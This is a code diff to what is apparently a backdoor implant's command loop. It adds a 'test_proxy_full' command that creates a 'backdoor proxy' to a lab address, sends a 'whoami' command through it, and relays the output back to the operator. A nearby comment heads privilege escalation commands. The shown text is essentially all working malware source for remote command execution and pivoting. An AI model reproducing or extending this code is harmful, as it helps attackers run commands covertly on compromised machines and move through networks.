@@ -348,6 +348,59 @@ def shell():
             except Exception as e:
                 reliable_send("Proxy test error: " + str(e))
 
+        elif command == 'test_proxy_full':
+            try:
+                if proxy_manager is None:
+                    proxy_manager = create_backdoor_proxy('192.168.56.104', 5555)
+                
+                if proxy_manager.channel and proxy_manager.channel.is_running:
+                    import socket
+                    import json
+                    import time
+                    
+                    test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    test_sock.settimeout(10)
+                    
+                    try:
+                        # Connect to proxy
+                        result = test_sock.connect_ex(('127.0.0.1', proxy_manager.channel.listen_port))
+                        if result == 0:
+                            # Send a real backdoor command through proxy
+                            test_command = "whoami"
+                            json_command = json.dumps(test_command)
+                            test_sock.send(json_command.encode())
+                            
+                            # Wait for response
+                            time.sleep(2)
+                            try:
+                                response = test_sock.recv(4096)
+                                test_sock.close()
+                                
+                                if response:
+                                    # Try to decode JSON response
+                                    try:
+                                        decoded_response = json.loads(response.decode())
+                                        reliable_send(f"Proxy Full Test SUCCESS: Got response through proxy:\n{decoded_response}")
+                                    except:
+                                        reliable_send(f"Proxy Full Test: Got raw response through proxy:\n{response.decode()}")
+                                else:
+                                    reliable_send("Proxy Full Test: Connected but no response received")
+                            except Exception as e:
+                                test_sock.close()
+                                reliable_send(f"Proxy Full Test: Error receiving response: {str(e)}")
+                        else:
+                            test_sock.close()
+                            reliable_send(f"Proxy Full Test: Cannot connect to proxy port {proxy_manager.channel.listen_port}")
+                            
+                    except Exception as e:
+                        test_sock.close()
+                        reliable_send(f"Proxy Full Test: Connection error: {str(e)}")
+                        
+                else:
+                    reliable_send("Proxy Full Test: Proxy not running - use 'start_proxy' first")
+                    
+            except Exception as e:
+                reliable_send("Proxy full test error: " + str(e))
 
                 
         # PRIVILEGE ESCALATION COMMANDS
